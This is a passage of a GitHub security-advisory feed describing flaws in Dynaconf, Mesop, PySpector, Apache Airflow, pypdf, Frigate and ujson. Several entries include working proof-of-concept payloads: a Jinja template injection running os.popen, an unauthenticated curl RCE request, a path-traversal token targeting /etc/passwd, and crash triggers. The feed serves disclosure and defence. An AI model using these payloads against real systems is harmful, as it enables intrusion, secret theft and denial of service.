        <updated>2026-03-18T20:08:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Dynaconf is vulnerable to Server-Side Template Injection (SSTI) due to unsafe template evaluation in the @jinja resolver.
When the jinja2 package is installed, Dynaconf evaluates template expressions embedded in configuration values without a sandboxed environment.</p>
<p>If an attacker can influence configuration sources such as:
environment variables
.env files
container environment configuration
CI/CD secrets
they can execute arbitrary OS commands on the host system.
In addition, the @format resolver allows object graph traversal, which may expose sensitive runtime objects and environment variables.</p>
<h3 id="details">Details</h3>
<p>The vulnerability arises because Dynaconf's string resolvers lack proper security boundaries.</p>
<ol>
<li>@jinja Resolver
The @jinja resolver renders templates using full Jinja2 evaluation.
However, the rendering context is not sandboxed, which allows attackers to access Python's internal attributes.
Using objects such as cycler, attackers can reach Python's <strong>globals</strong> and import the os module.</li>
</ol>
<p>Example attack path
cycler
 → <strong>init</strong>
 → <strong>globals</strong>
 → os
 → popen()
This leads to arbitrary command execution.</p>
<ol start="2">
<li>@format Resolver
The @format resolver performs Python string formatting using internal objects.
This allows attackers to traverse Python's object graph and access sensitive runtime objects.
Example traversal:
{this.<strong>class</strong>.<strong>init</strong>.<strong>globals</strong>[os].environ}
This can expose</li>
</ol>
<ul>
<li>API keys</li>
<li>database credentials</li>
<li>internal service tokens</li>
<li>environment secrets</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code>import os
from dynaconf import Dynaconf
# Malicious configuration injection
os.environ["DYNACONF_RCE"] = "@jinja {{ cycler.__init__.__globals__.os.popen('id').read() }}"
settings = Dynaconf()
print("[!] Command Execution Result:")
print(settings.RCE)
</code></pre>
<h3 id="impact">Impact</h3>
<p>Successful exploitation allows attackers to:</p>
<ul>
<li>Execute arbitrary OS commands on the host system</li>
<li>Access sensitive environment variables</li>
<li>Compromise application secrets</li>
<li>Fully compromise the running application process
Because configuration values may originate from CI/CD pipelines, container orchestration systems, or environment injection, this vulnerability can become remotely exploitable in real-world deployments.</li>
</ul>
<h3 id="remediation--mitigation-examples">Remediation / Mitigation (Examples)</h3>
<ol>
<li>Use Jinja2 sandbox for template rendering</li>
</ol>
<pre><code>from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string("{{ config_value }}")
safe_value = template.render(config_value=user_input)```
</code></pre>
<ol start="2">
<li>Restrict @format usage to trusted values</li>
</ol>
<pre><code>safe_value = "{name}".format(name=trusted_name)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dynaconf/dynaconf/security/advisories/GHSA-pxrr-hq57-q35p">https://github.com/dynaconf/dynaconf/security/advisories/GHSA-pxrr-hq57-q35p</a></li>
<li><a href="https://github.com/advisories/GHSA-pxrr-hq57-q35p">https://github.com/advisories/GHSA-pxrr-hq57-q35p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pxrr-hq57-q35p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-18T20:08:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mesop] Mesop Affected by Unauthenticated Remote Code Execution via Test Suite Route /exec-py]]></title>
        <id>https://github.com/advisories/GHSA-gjgx-rvqr-6w6v</id>
        <link href="https://github.com/advisories/GHSA-gjgx-rvqr-6w6v"/>
        <updated>2026-03-18T20:05:01.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>An explicit web endpoint inside the <code>ai/</code> testing module infrastructure directly ingests untrusted Python code strings unconditionally without authentication measures, yielding standard Unrestricted Remote Code Execution. Any individual capable of routing HTTP logic to this server block will gain explicit host-machine command rights.</p>
<h4 id="details">Details</h4>
<p>The AI codebase package includes a lightweight debugging Flask server inside <code>ai/sandbox/wsgi_app.py</code>. The <code>/exec-py</code> route accepts base_64 encoded raw string payloads inside the <code>code</code> parameter natively evaluated by a basic <code>POST</code> web request. It saves it rapidly to the operating system logic path and injects it recursively using <code>execute_module(module_path...)</code>.</p>
<pre><code class="language-python"># ai/sandbox/wsgi_app.py
@flask_app.route("/exec-py", methods=["POST"])
def exec_py_route():
  code = base64.urlsafe_b64decode(request.form.get("code"))
  # ... code is blindly written to file and forcefully executed
</code></pre>
<h4 id="poc">PoC</h4>
<pre><code class="language-bash"># Payload:
# import os
# os.system('echo "pwned by attacker" &gt; /tmp/pwned.txt')
# 
# Base64 string represents the identical payload block above: 
# aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAicHduZWQgYnkgYXR0YWNrZXIiID4gL3RtcC9wd25lZC50eHQnKQ==

curl -X POST http://&lt;target_ip_address_hosting_sandbox&gt;:port/exec-py \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "code=aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAicHduZWQgYnkgYXR0YWNrZXIiID4gL3RtcC9wd25lZC50eHQnKQ=="

# Validate exploitation target execution natively:
# $ cat /tmp/pwned.txt
# pwned by attacker
</code></pre>
<h4 id="impact">Impact</h4>
<p>This presents trivial severity for systems publicly exposed or lacking strictly verified boundary firewalls due to absolute unauthenticated command injection privileges targeting the direct execution interpreter running this service sandbox.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mesop-dev/mesop/security/advisories/GHSA-gjgx-rvqr-6w6v">https://github.com/mesop-dev/mesop/security/advisories/GHSA-gjgx-rvqr-6w6v</a></li>
<li><a href="https://github.com/advisories/GHSA-gjgx-rvqr-6w6v">https://github.com/advisories/GHSA-gjgx-rvqr-6w6v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gjgx-rvqr-6w6v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-18T20:05:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mesop] Mesop has a Path Traversal utilizing `FileStateSessionBackend` leads to Application Denial of Service and File Write/Deletion]]></title>
        <id>https://github.com/advisories/GHSA-8qvf-mr4w-9x2c</id>
        <link href="https://github.com/advisories/GHSA-8qvf-mr4w-9x2c"/>
        <updated>2026-03-18T20:01:23.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>A Path Traversal vulnerability allows any user (or attacker) supplying an untrusted <code>state_token</code> through the UI stream payload to arbitrarily target files on the disk under the standard file-based runtime backend. This can result in application denial of service (via crash loops when reading non-msgpack target files as configurations), or arbitrary file manipulation.</p>
<h4 id="details">Details</h4>
<p>When the framework is configured to use the disk-based session backend (<code>FileStateSessionBackend</code>), the user's <code>state_token</code> actively dictates where the runtime session state is physically saved or queried natively on disk. 
In <code>mesop/server/server.py</code>, specifically the <code>ui_stream</code> endpoint, the <code>event.state_token</code> is collected directly from the untrusted incoming protobuf message struct: <code>mesop.protos.ui_pb2.UserEvent</code>.
Because this is unconditionally passed to <code>FileStateSessionBackend._make_file_path(self, token)</code>, it evaluates standard path operators (e.g. <code>../../../</code>). </p>
<pre><code class="language-python"># mesop/server/state_session.py
  def _make_file_path(self, token: str) -&gt; Path:
    return self.base_dir / (self.prefix + token)
</code></pre>
<p>Python's standard library natively resolves OS traversal semantics allowing full escape from the <code>base_dir</code> destination intent.</p>
<h4 id="poc">PoC</h4>
<p>An attacker can utilize Python to craft and send a malicious Protobuf payload to the <code>/ui</code> stream.</p>
<pre><code class="language-python">import requests
import mesop.protos.ui_pb2 as pb # Assuming mesop protos are compiled

# 1. Craft the malicious protobuf message
user_event = pb.UserEvent()
# Escaping the tmp directory via path traversal to target a sensitive file, e.g., the root crontab or a system file
user_event.state_token = "../../../../etc/passwd" 

# Alternatively, targeting Windows:
# user_event.state_token = "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"

serialized_event = user_event.SerializeToString()

# 2. Send the message to the ui stream endpoint
headers = {'Content-Type': 'application/x-protobuf'}
response = requests.post(
    "http://localhost:32123/ui",
    data=serialized_event,
    headers=headers
)

# The server will attempt to parse /etc/passwd using msgpack, 
# resulting in a crash or reading/overwriting operations depending on the request type invoked.
print(response.content)
</code></pre>
<h4 id="impact">Impact</h4>
<p>This vulnerability heavily exposes systems hosted utilizing <code>FileStateSessionBackend</code>. Unauthorized malicious actors could interact with arbitrary payloads overwriting or explicitly removing underlying service resources natively outside the application bounds.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mesop-dev/mesop/security/advisories/GHSA-8qvf-mr4w-9x2c">https://github.com/mesop-dev/mesop/security/advisories/GHSA-8qvf-mr4w-9x2c</a></li>
<li><a href="https://github.com/advisories/GHSA-8qvf-mr4w-9x2c">https://github.com/advisories/GHSA-8qvf-mr4w-9x2c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8qvf-mr4w-9x2c</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-18T20:01:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyspector] Stored XSS in PySpector HTML Report Generation leads to Javascript Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-2gmv-2r3v-jxj2</id>
        <link href="https://github.com/advisories/GHSA-2gmv-2r3v-jxj2"/>
        <updated>2026-03-18T16:33:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>PySpector versions <code>&lt;= 0.1.6</code> are affected by a stored Cross-Site Scripting (XSS) vulnerability in the HTML report generator. When PySpector scans a Python file containing JavaScript payloads (i.e. inside a string passed to <code>eval()</code> ), the flagged code snippet is interpolated into the HTML report without sanitization. Opening the generated report in a browser causes the embedded JavaScript to execute in the browser's local file context.</p>
<h3 id="impact">Impact</h3>
<p>An attacker can craft a malicious Python file (for example, hosted in a public repository), designed to be scanned by PySpector. When a victim scans this file and opens the resulting HTML report, arbitrary JavaScript executes in their browser. While the <code>file://</code> context limits the attacker's ability to exfiltrate cookies or make credentialed requests, the following is still achievable:</p>
<ul>
<li>Arbitrary DOM manipulation</li>
<li>Redirects to attacker-controlled pages</li>
<li>Theft of locally accessible data via <code>fetch()</code> or <code>XMLHttpRequest</code> to <code>file://</code> paths (browser-dependent)</li>
</ul>
<p>Any user of PySpector who scans untrusted code and generates HTML reports, is potentially affected.</p>
<h3 id="poc">PoC</h3>
<p>The following steps reproduce the vulnerability on PySpector <code>&lt;= 0.1.6</code>:</p>
<ol>
<li>Create a malicious Python file containing a JavaScript payload embedded in a string argument to <code>eval()</code>, and run PySpector against the file, generating an HTML report:<img width="871" height="752" alt="image" src="https://github.com/user-attachments/assets/1b0a57f2-3632-4347-a9b7-6a94dc2e82b2"></li>
<li>Open the generated HTML report in any browser:<img width="1920" height="920" alt="image" src="https://github.com/user-attachments/assets/a4075c4a-6153-41b4-ad77-81d009d7a9f8"></li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ParzivalHack/PySpector/security/advisories/GHSA-2gmv-2r3v-jxj2">https://github.com/ParzivalHack/PySpector/security/advisories/GHSA-2gmv-2r3v-jxj2</a></li>
<li><a href="https://github.com/advisories/GHSA-2gmv-2r3v-jxj2">https://github.com/advisories/GHSA-2gmv-2r3v-jxj2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2gmv-2r3v-jxj2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-18T16:33:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyspector] PySpector has a Plugin Sandbox Bypass leads to Arbitrary Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-v3xv-8vc3-h2m6</id>
        <link href="https://github.com/advisories/GHSA-v3xv-8vc3-h2m6"/>
        <updated>2026-03-18T16:33:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>PySpector versions <code>&lt;= 0.1.6</code> are affected by a security validation bypass in the plugin system. The <code>validate_plugin_code()</code> function in <code>plugin_system.py</code>, performs static AST analysis to block dangerous API calls before a plugin is trusted and executed. However, the <code>internal resolve_name()</code> helper only handles <code>ast.Name</code> and <code>ast.Attribute</code> node types, returning <code>None</code> for all others. When a plugin uses indirect function calls via <code>getattr()</code> (such as <code>getattr(os, 'system')</code>) the outer call's func node is of type <code>ast.Call</code>, causing <code>resolve_name()</code> to return <code>None</code>, and the security check to be silently skipped. The plugin incorrectly passes the trust workflow, and executes arbitrary system commands on the user's machine when loaded.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can deliver a malicious plugin file to a PySpector user and convince them to install it, can achieve arbitrary code execution on the user's local machine. Exploitation requires the victim to explicitly run <code>pyspector plugin install --trust</code> on the malicious file (a deliberate multi-step action that meaningfully limits the attack surface compared to passive vulnerabilities). However, the bypass directly undermines the security guarantee that <code>validate_plugin_code()</code> is designed to provide. Once the plugin is trusted and executed, the following is achievable:</p>
<ul>
<li>Full read/write access to the local filesystem</li>
<li>Exfiltration of sensitive data and environment variables (i.e. API keys, credentials, etc...)</li>
<li>Establishment of persistence mechanisms</li>
<li>Lateral movement in CI/CD environments where PySpector runs with elevated permissions (pre-commit hooks and scheduled scans)</li>
</ul>
<p>Any user of PySpector who installs third-party plugins outside the official repository is potentially affected.</p>
<h3 id="poc">PoC</h3>
<p>The following steps reproduce the vulnerability on PySpector <code>&lt;= 0.1.6</code>:</p>
<ol>
<li>Create a malicious plugin file that uses getattr-based indirect calls to bypass AST validation, and confirm the validator incorrectly marks it as safe:<img width="1300" height="675" alt="image" src="https://github.com/user-attachments/assets/4de3a0d1-1c77-4454-ad10-2369d5ca9997"></li>
<li>Run PySpector Plugin Validator module (this confirms the validator incorrectly marks the plugin as safe):<img width="908" height="239" alt="image" src="https://github.com/user-attachments/assets/3e3b9603-4d95-4a39-be97-4163f6639599"></li>
<li>Install and trust the plugin through the normal PySpector workflow:</li>
</ol>
<p><code>pyspector plugin install /tmp/evil_plugin.py --trust</code>
4. Execute the plugin, during a scan:
<code>pyspector scan /any/target --plugin evil</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ParzivalHack/PySpector/security/advisories/GHSA-v3xv-8vc3-h2m6">https://github.com/ParzivalHack/PySpector/security/advisories/GHSA-v3xv-8vc3-h2m6</a></li>
<li><a href="https://github.com/advisories/GHSA-v3xv-8vc3-h2m6">https://github.com/advisories/GHSA-v3xv-8vc3-h2m6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3xv-8vc3-h2m6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-18T16:33:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: Execution API HITL Endpoints Missing Per-Task Authorization]]></title>
        <id>https://github.com/advisories/GHSA-8x34-9q3v-h7g8</id>
        <link href="https://github.com/advisories/GHSA-8x34-9q3v-h7g8"/>
        <updated>2026-03-18T16:33:18.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow versions 3.1.0 through 3.1.7 missing authorization vulnerability in the Execution API's Human-in-the-Loop (HITL) endpoints that allows any authenticated task instance to read, approve, or reject HITL workflows belonging to any other task instance.</p>
<p>Users are recommended to upgrade to Apache Airflow 3.1.8 or later, which resolves this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30911">https://nvd.nist.gov/vuln/detail/CVE-2026-30911</a></li>
<li><a href="https://github.com/apache/airflow/pull/62886">https://github.com/apache/airflow/pull/62886</a></li>
<li><a href="https://lists.apache.org/thread/1rs2v7fcko2otl6n9ytthcj87cmsgx51">https://lists.apache.org/thread/1rs2v7fcko2otl6n9ytthcj87cmsgx51</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/03/17/2">http://www.openwall.com/lists/oss-security/2026/03/17/2</a></li>
<li><a href="https://github.com/advisories/GHSA-8x34-9q3v-h7g8">https://github.com/advisories/GHSA-8x34-9q3v-h7g8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8x34-9q3v-h7g8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-17T12:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: Path of session token in cookie does not consider base_url - session hijacking via co-hosted applications]]></title>
        <id>https://github.com/advisories/GHSA-4fhm-p86v-hwpx</id>
        <link href="https://github.com/advisories/GHSA-4fhm-p86v-hwpx"/>
        <updated>2026-03-18T16:32:55.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow versions 3.1.0 through 3.1.7&nbsp;session token (_token) in cookies is set to path=/ regardless of the configured [webserver] base_url or [api] base_url.
This allows any application co-hosted under the same domain to capture valid Airflow session tokens from HTTP request headers, allowing full session takeover without attacking Airflow itself.</p>
<p>Users are recommended to upgrade to Apache Airflow 3.1.8 or later, which resolves this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28779">https://nvd.nist.gov/vuln/detail/CVE-2026-28779</a></li>
<li><a href="https://github.com/apache/airflow/pull/62771">https://github.com/apache/airflow/pull/62771</a></li>
<li><a href="https://lists.apache.org/thread/r4n5znb8mcq14wo9v8ndml36nxlksdqb">https://lists.apache.org/thread/r4n5znb8mcq14wo9v8ndml36nxlksdqb</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/03/17/3">http://www.openwall.com/lists/oss-security/2026/03/17/3</a></li>
<li><a href="https://github.com/advisories/GHSA-4fhm-p86v-hwpx">https://github.com/advisories/GHSA-4fhm-p86v-hwpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4fhm-p86v-hwpx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-17T12:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: DAG authorization bypass]]></title>
        <id>https://github.com/advisories/GHSA-x3fv-96qh-67m7</id>
        <link href="https://github.com/advisories/GHSA-x3fv-96qh-67m7"/>
        <updated>2026-03-18T16:19:31.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow versions 3.1.0 through 3.1.7 /ui/dependencies endpoint returns the full DAG dependency graph without filtering by authorized DAG IDs. This allows an authenticated user with only DAG Dependencies permission to enumerate DAGs they are not authorized to view.</p>
<p>Users are recommended to upgrade to Apache Airflow 3.1.8 or later, which resolves this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28563">https://nvd.nist.gov/vuln/detail/CVE-2026-28563</a></li>
<li><a href="https://github.com/apache/airflow/pull/62046">https://github.com/apache/airflow/pull/62046</a></li>
<li><a href="https://lists.apache.org/thread/dwzf62qg9z8wvfsjknpfd8bvtwghd49s">https://lists.apache.org/thread/dwzf62qg9z8wvfsjknpfd8bvtwghd49s</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/03/17/5">http://www.openwall.com/lists/oss-security/2026/03/17/5</a></li>
<li><a href="https://github.com/advisories/GHSA-x3fv-96qh-67m7">https://github.com/advisories/GHSA-x3fv-96qh-67m7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x3fv-96qh-67m7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-17T12:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: Wildcard DagVersion Listing Bypasses Per‑DAG RBAC and Leaks Metadata]]></title>
        <id>https://github.com/advisories/GHSA-4m3h-wp5w-5hqh</id>
        <link href="https://github.com/advisories/GHSA-4m3h-wp5w-5hqh"/>
        <updated>2026-03-18T16:19:16.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow versions 3.0.0 through 3.1.7&nbsp;FastAPI DagVersion listing API does not apply per-DAG authorization filtering when the request is made with dag_id set to "~" (wildcard for all DAGs). As a result, version metadata of DAGs that the requester is not authorized to access is returned.</p>
<p>Users are recommended to upgrade to Apache Airflow 3.1.8 or later, which resolves this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26929">https://nvd.nist.gov/vuln/detail/CVE-2026-26929</a></li>
<li><a href="https://github.com/apache/airflow/pull/61675">https://github.com/apache/airflow/pull/61675</a></li>
<li><a href="https://lists.apache.org/thread/g5o6khx83jwqvdyn0mlyb0krt35cs9ss">https://lists.apache.org/thread/g5o6khx83jwqvdyn0mlyb0krt35cs9ss</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/03/17/4">http://www.openwall.com/lists/oss-security/2026/03/17/4</a></li>
<li><a href="https://github.com/advisories/GHSA-4m3h-wp5w-5hqh">https://github.com/advisories/GHSA-4m3h-wp5w-5hqh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4m3h-wp5w-5hqh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-17T12:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypdf] pypdf has inefficient decoding of array-based streams]]></title>
        <id>https://github.com/advisories/GHSA-qpxp-75px-xjcp</id>
        <link href="https://github.com/advisories/GHSA-qpxp-75px-xjcp"/>
        <updated>2026-03-18T16:17:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to long runtimes and/or large memory usage. This requires accessing an array-based stream with lots of entries.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in <a href="https://github.com/py-pdf/pypdf/releases/tag/6.9.1">pypdf==6.9.1</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade yet, consider applying the changes from PR <a href="https://github.com/py-pdf/pypdf/pull/3686">#3686</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-qpxp-75px-xjcp">https://github.com/py-pdf/pypdf/security/advisories/GHSA-qpxp-75px-xjcp</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/3686">https://github.com/py-pdf/pypdf/pull/3686</a></li>
<li><a href="https://github.com/py-pdf/pypdf/releases/tag/6.9.1">https://github.com/py-pdf/pypdf/releases/tag/6.9.1</a></li>
<li><a href="https://github.com/advisories/GHSA-qpxp-75px-xjcp">https://github.com/advisories/GHSA-qpxp-75px-xjcp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qpxp-75px-xjcp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-18T16:17:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[frigate] Frigte has broken access control viewer user can delete admin and other users account]]></title>
        <id>https://github.com/advisories/GHSA-vg28-83rp-8xx4</id>
        <link href="https://github.com/advisories/GHSA-vg28-83rp-8xx4"/>
        <updated>2026-03-18T14:25:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Users with the viewer role can delete admin and other users account. It this leads to denial of service and affects data integrity.</p>
<h3 id="details">Details</h3>
<p>Endpoint <code>DELETE /api/users/admin</code> is enable to anonymous user.</p>
<img width="436" height="100" alt="obraz" src="https://github.com/user-attachments/assets/817f9c47-7bd9-4247-a2f1-0f40778ab229">

<h3 id="poc">PoC</h3>
<p>I deleted admin user on <code>demo.frigate.video</code>:</p>
<img width="1091" height="222" alt="obraz" src="https://github.com/user-attachments/assets/34f50a13-3bb7-4aa8-99fa-bd815b3dc915">


<h3 id="impact">Impact</h3>
<p>It this leads to denial of service and affects data integrity.</p>
<h3 id="recommended-fixes">Recommended Fixes</h3>
<p>Restrict access to the endpoint to authenticated admin users only:
Add <code>dependencies=[Depends(require_role(["admin"]))])</code> to this endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/blakeblackshear/frigate/security/advisories/GHSA-vg28-83rp-8xx4">https://github.com/blakeblackshear/frigate/security/advisories/GHSA-vg28-83rp-8xx4</a></li>
<li><a href="https://github.com/advisories/GHSA-vg28-83rp-8xx4">https://github.com/advisories/GHSA-vg28-83rp-8xx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vg28-83rp-8xx4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-18T14:25:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ujson] UltraJSON has an integer overflow handling large indent leads to buffer overflow or infinite loop]]></title>
        <id>https://github.com/advisories/GHSA-c8rr-9gxc-jprv</id>
        <link href="https://github.com/advisories/GHSA-c8rr-9gxc-jprv"/>
        <updated>2026-03-19T11:30:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>ujson.dumps()</code> crashes the Python interpreter (segmentation fault) when the product of the <code>indent</code> parameter and the nested depth of the input exceeds INT32_MAX. It can also get stuck in an infinite loop if the <code>indent</code> is a large negative number. Both are caused by an integer overflow/underflow whilst calculating how much memory to reserve for indentation. And both can be used to achieve denial of service.</p>
<p>(Note: A negative indent to <code>ujson</code> means add spaces after colons but do not add line breaks or indentation. It is unclear to the current maintainers whether this was ever even an intended feature or just a byproduct of the way it was written.)</p>
<h3 id="exploitability">Exploitability</h3>
<p>To be vulnerable, a service must call <code>ujson.dump()</code>/<code>ujson.dumps()</code>/<code>ujson.encode()</code> whilst giving untrusted users control over the <code>indent</code> parameter and not restrict that indentation to reasonably small non-negative values. (Even with the fix for this vulnerability, such usage is strongly advised against since even a bug-free JSON serialiser would be vulnerable to denial of service simply by the attacker requesting indents that have the server needlessly filling out gigabytes of whitespace.)</p>
<p>A service may also be vulnerable to the infinite loop if it uses a fixed <em>negative</em> <code>indent</code>. An underflow always occurs for any negative indent when the input data is at least one level nested but, for small negative indents, the underflow is usually accidentally rectified by another overflow. As far as the maintainers are aware, the infinite loop can not be reached for indentations from -1 to -65536 / max_recursion_depth_as_limited_by_stack_size but users of negative indents are encouraged to consider their service affected even if the infinite loop seems unreachable.</p>
<h3 id="example">Example</h3>
<pre><code class="language-python">import ujson

def example(depth, indent):
    a = [0]
    for i in range(1000):
        a = [a]
    ujson.dumps(a, indent=indent)

example(1, 2**30)  # segfault
example(1000, -200)  # infinite loop
</code></pre>
<h3 id="patches">Patches</h3>
<p>ujson 5.12.0, containing 486bd4553dc471a1de11613bc7347a6b318e37ea, promotes the integer types where the overflow occurred, skips the indentation code path for negative indent (which was supposed to be a no-op) and places an artificial cap of 1000 on the <code>indent</code> parameter.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users who don't wish to upgrade can either use a fixed indentation, no indentation or ensure indentation is non-negative and not enormous (below <code>2**31 / max_recursion_depth_as_limited_by_stack_size</code>).</p>
<h3 id="references">References</h3>
<p>The original bug report can be found at <a href="https://github.com/ultrajson/ultrajson/issues/700">https://github.com/ultrajson/ultrajson/issues/700</a></p>
<p>This issue was independently discovered by @coco1629, @EthanKim88 and @vmfunc.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ultrajson/ultrajson/security/advisories/GHSA-c8rr-9gxc-jprv">https://github.com/ultrajson/ultrajson/security/advisories/GHSA-c8rr-9gxc-jprv</a></li>
<li><a href="https://github.com/ultrajson/ultrajson/issues/700">https://github.com/ultrajson/ultrajson/issues/700</a></li>
<li><a href="https://github.com/ultrajson/ultrajson/commit/486bd4553dc471a1de11613bc7347a6b318e37ea">https://github.com/ultrajson/ultrajson/commit/486bd4553dc471a1de11613bc7347a6b318e37ea</a></li>
<li><a href="https://github.com/advisories/GHSA-c8rr-9gxc-jprv">https://github.com/advisories/GHSA-c8rr-9gxc-jprv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c8rr-9gxc-jprv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-18T13:01:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ujson] UltraJSON has a Memory Leak parsing large integers allows DoS ]]></title>
        <id>https://github.com/advisories/GHSA-wgvc-ghv9-3pmm</id>
        <link href="https://github.com/advisories/GHSA-wgvc-ghv9-3pmm"/>
        <updated>2026-03-18T13:01:16.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>ujson 5.4.0 to 5.11.0 inclusive contain an accumulating memory leak in JSON parsing <em>large</em> (outside of the range [-2^63, 2^64 - 1]) integers.</p>
<h4 id="exploitability">Exploitability</h4>
<p>Any service that calls <code>ujson.load()</code>/<code>ujson.loads()</code>/<code>ujson.decode()</code> on untrusted inputs is affected and vulnerable to denial of service attacks.</p>
<h4 id="details">Details</h4>
<p>The leaked memory is a copy of the string form of the integer plus an additional NULL byte. The leak occurs irrespective of whether the integer parses successfully or is rejected due to having more than <code>sys.get_int_max_str_digits()</code> digits, meaning that any sized leak per malicious JSON can be achieved provided that there is no limit on the overall size of the payload.</p>
<pre><code class="language-python">ujson.loads(str(2 ** 64 - 1))  # No leak
ujson.loads(str(2 ** 64))  # Leaks
